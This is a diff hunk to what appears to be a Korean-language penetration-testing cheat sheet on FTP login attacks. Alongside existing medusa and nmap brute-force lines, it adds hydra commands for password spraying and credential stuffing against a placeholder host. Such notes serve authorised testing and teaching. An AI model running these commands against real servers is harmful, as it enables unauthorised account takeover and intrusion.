@@ -172,6 +172,12 @@ medusa -h <IP> -u admin -P rockyou.txt -M ftp
 
 # nmap 스크립트
 nmap -p 21 --script=ftp-brute --script-args userdb=users.txt,passdb=pass.txt <IP>
+
+# 패스워드 스프레잉
+hydra -L users.txt -p '<비밀번호>' ftp://<IP> -t 1
+
+# 패스워드 스터핑
+hydra -C user_pass.list ftp://<IP>
 ```
 
 ---
